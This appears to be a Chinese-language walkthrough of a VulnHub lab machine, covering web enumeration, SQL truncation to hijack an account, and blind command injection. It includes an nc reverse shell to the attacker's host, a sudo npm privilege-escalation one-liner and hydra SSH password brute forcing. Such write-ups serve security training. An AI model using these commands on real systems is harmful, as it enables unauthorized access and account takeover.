&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODMv&#34;&gt;http://192.168.0.183/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1345.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一个 apache 界面，看了一下框架，查看 robots 协议，.git 文件，审查源代码后均没有什么发现，开始扫描目录&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url http://192.168.0.183&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;common.txt 字典稍微小一点，扫的速度比较快，是个不错的字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1346.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有扫描到有价值的信息，换个大字典在扫一下&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.183/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1348.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫到一个目录 bluesky，访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODMvYmx1ZXNreQ==&#34;&gt;http://192.168.0.183/bluesky&lt;/span&gt; 发现了一个新的站点，是一个新的 web 界面，可对此进行扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1350.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url http://192.168.0.183/bluesky&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1352.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wfuzz-测试参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-测试参数&#34;&gt;#&lt;/a&gt; wfuzz 测试参数&lt;/h3&gt;
&lt;p&gt;看到了注册登陆的功能，可以在 signup.php 下注册&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1354.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;然后在 login.php 下登陆&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1356.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登陆成功之后，dashboard 页面显示出了当前的用户名&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1357.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 port 界面看到了有一个 LFI 漏洞的提示&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1358.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 wfuzz 测试一下是否有参数&lt;br&gt;
 &lt;code&gt;wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -u http://192.168.0.183/bluesky/port.php?FUZZ=xxx&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1359.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现回显全是 302 ，过滤之后在看看，判断是否有参数&lt;br&gt;
 &lt;code&gt;wfuzz -c -u http://192.168.31.53/bluesky/port.php?FUZZ=xxx) -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | grep -v 302&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1360.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;审查源代码，看看有没有什么提示，发现了一个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1361.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是访问不到这个文件，可能是做了一些变异&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1362.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;脑力测试解谜&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脑力测试解谜&#34;&gt;#&lt;/a&gt; 脑力测试解谜&lt;/h3&gt;
&lt;p&gt;依次尝试怎么能访问到这个 imp.txt，最后在如下链接中找到了 imp.txt&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNjgvfnRvcmFuZG8vaW1wLnR4dA==&#34;&gt;http://192.168.0.168/~torando/imp.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1363.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最后还有一个 contact.php，点开看看说是一些功能出于安全因素已经修复&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1364.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;整理一下收集到的重要的信息，有一份 imp.txt 可能是一些邮箱地址，还有一个注册一个登陆的地方，需要通过这几个条件做突破&lt;/p&gt;
&lt;p&gt;将 imp.txt 下载到本地&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1365.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次用这几个用户尝试注册登陆，第一个用户是新用户，可进入其管理中心&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1366.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;第二个也是一个未注册的新用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1367.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直到用第三个用户注册的时候，发现了输入的用户名的长度被限制了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1368.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改源代码的长度限制，注册此用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1369.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注册后发现也是一个新用户，可以进入其管理中心，想必这几个用户大部分都是未注册的用户，少部分是一些敏感用户，直接用 burp 批量注册发现有两个用户是注册过的一个是 admin@torando，一个是 jacob@torando&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1370.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这两个用户是已经存在的用户，考虑爆破密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1371.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;burp批量注册&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp批量注册&#34;&gt;#&lt;/a&gt; burp 批量注册&lt;/h3&gt;
&lt;p&gt;数据拦截到 burp 中，选择 Cluster bomb 模式，对其进行爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1372.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;uname 参数就设置为两个已经存在的用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1373.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;密码就选用常用来做 web 目录扫描的 directory-list-2.3-meduim.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1374.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;爆破了一段时间之后，出现了结果，爆出来了 admin 用户的两个密码，是的两个密码，很奇怪，为什么会有两个密码？&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1375.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;选取一个密码进入 admin 的管理中心看看，没有什么发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1376.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;最后的线索指向了一个已经注册的用户 jacob@torando，还有在页面前端做了 13 的长度限制，以及 admin 用户有两个密码。&lt;/p&gt;
&lt;h3 id=&#34;sql截断攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql截断攻击&#34;&gt;#&lt;/a&gt; sql 截断攻击&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;sql 截断攻击：&lt;br&gt;
当数据库由于长度限制而截断用户输入时，就会发生 SQL 截断漏洞。攻击者可以收集关键字段 (例如用户名) 长度的信息，并利用这些信息获得未经授权的访问。&lt;br&gt;
改变用户名的输入框的输入限制，并开始给 jacob@tornado 用户再次申请一个密码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1377.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注册成功之后，用 jacob@tornado 登陆后发现是可以的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1378.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在这个用户的 contact.php 界面找到了一个可以交互的界面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1379.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入内容后，在页面中有回显，左下角显示出来了 id&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1380.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;无回显rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无回显rce&#34;&gt;#&lt;/a&gt; 无回显 RCE&lt;/h3&gt;
&lt;p&gt;既然有输入有回显，就很有可能是 RCE 漏洞，输入 id’;id, 但是回显依然是本身，可能不是单纯的 linux 的 echo‘id’命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1381.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;不知道命令是否执行了，用命令注入无回显的方法试试，先用 dnslog 测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1383.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是 dnslog 没有任何回显，可能命令执行了，但是服务器没有 curl 命令也会出现这样的情况，还可以用抓包的方式判断此命令是否执行。&lt;/p&gt;
&lt;h3 id=&#34;tcpdump抓包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tcpdump抓包&#34;&gt;#&lt;/a&gt; tcpdump 抓包&lt;/h3&gt;
&lt;p&gt;在 kali 上用 tcpdump 抓包，监听 eth0 网卡，以及靶机 ip&lt;br&gt;
 &lt;code&gt;sudo tcpdump -i eth0 host 192.168.0.183&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1384.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;此接口处用来 ping kali 机器，注意一定要搞成发送固定的数据包，不然 ping 没法中断下来，导致重启靶机才能解决  &lt;code&gt;ping -c 4 192.168.0.168&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1385.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;在 ping 之后，上述 tcpdump 就会抓取到网卡的数据，证明这里的命令最终会被服务器执行，就可以在这里构造 payload 反弹 shell。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;反弹 shell，接受会话，美化终端&lt;br&gt;
 &lt;code&gt;nc 192.168.0.168 4444 -e /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1386.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集服务器信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1387.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现服务器有 root、catchme、tornado 三个有 bash 的用户，并且 www-data 可以免密调用 catchme 的 npm 命令执行&lt;/p&gt;
&lt;h3 id=&#34;sudonpm提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudonpm提权&#34;&gt;#&lt;/a&gt; sudo (npm) 提权&lt;/h3&gt;
&lt;p&gt;在 GTFobins 上找到了思路，写 payload 进行提权需要两个文件，一个 package.json,&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zaGVsbC1mZzFoeWouc2g=&#34;&gt; 一个 shell.sh&lt;/span&gt;，用 chmod 使其可执行&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vi package.json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &amp;quot;name&amp;quot;: &amp;quot;shell&amp;quot;, &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;, &amp;quot;description&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;, &amp;quot;scripts&amp;quot;: &amp;#123; &amp;quot;shell&amp;quot;: &amp;quot;./shell.sh&amp;quot; &amp;#125;, &amp;quot;author&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/bin/bash&amp;quot; &amp;gt;shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u catchme npm run shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1388.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;或者可以直接浓缩为一句话的 linux 命令，直接提权至 catchme 用户&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /tmp ; echo &amp;#x27; &amp;#123; &amp;quot;name&amp;quot;: &amp;quot;shell&amp;quot;, &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;, &amp;quot;description&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;main&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;index.js&amp;quot;, &amp;quot;scripts&amp;quot;: &amp;#123; &amp;quot;shell&amp;quot;: &amp;quot;./shell.sh&amp;quot; &amp;#125;, &amp;quot;author&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27; &amp;gt;package.json ; echo &amp;quot;/bin/bash&amp;quot; &amp;gt;shell.sh ;chmod +x shell.sh ; sudo -u catchme&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;npm run shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1389.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;凯撒解密脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#凯撒解密脚本&#34;&gt;#&lt;/a&gt; 凯撒解密脚本&lt;/h3&gt;
&lt;p&gt;在用户目录下找到了一个加密的英文字符串，看到 trrwnqc 之后感觉很像是一个英文字符移位之后的显示，猜测是采用了凯撒加密。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1390.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;网上找一个可以解密恺撒解密的脚本放在本地&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alphabet = string.ascii_lowercase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;encrypted = &amp;quot;hcjqnnsotrrwnqc&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;enc_len = len(encrypted)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(25):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  plain_text = &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for c in encrypted:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if c.islower():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			c_unicode = ord(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			c_index = ord(c) - ord(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			new_index = (c_index - i) % 26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			new_unicode = new_index + ord(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			new_character = chr(new_unicode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			plain_text = plain_text + new_character&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			plain_text += c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			print(f&amp;quot;ID:&amp;#123;i&amp;#125; : &amp;#123;plain_text&amp;#125;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此脚本的作用就是依次计算加密字符串偏移 1 - 26 后的解密值&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1391.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行脚本之后得到了如下字符串，其中最可疑的是 idkrootpussword&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1392.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看样子像是 root 的密码，但是试了一下，不能凭借此密码登陆到 root&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1393.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然这个密码不是最终的密码，就写一些变体如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1394.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 hydra 尝试一一破解，最后得到了真实的 root 密码&lt;br&gt;
 &lt;code&gt;hydra -l root -P secret.txt ssh://192.168.0.183 -f -t 64 -I -vV&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1395.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 切换到了 root 用户成功，拿到了 root 权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1396.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tcpdump抓包命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tcpdump抓包命令&#34;&gt;#&lt;/a&gt; tcpdump 抓包命令&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;TCPDump 可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供 and、or、not 等逻辑语句来帮助你去掉无用的信息。他的功能与 wireshark 的功能相同，是命令行版本的抓包工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;按网卡过滤：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump -i eth0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-tt ： 在每列倾倒资料上显示未经格式化的时间戳记； sudo tcpdump -i eth0 -tt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-n ：不把主机的网络地址转换成名字；&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump -i eth0 -n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-S ：用绝对而非相对数值列出 TCP 关联数；&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump -i eth0 -S&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-vv ：更详细显示指令执行过程；&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump -i eth0 -vv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-w &amp;lt;数据包文件&amp;gt; ：把数据包数据写入指定的文件：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump -i eth0 -w output.pcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1397.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-r &amp;lt;数据包文件&amp;gt; ：从指定的文件读取数据包数据；&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tcpdump -r output.pcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1398.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
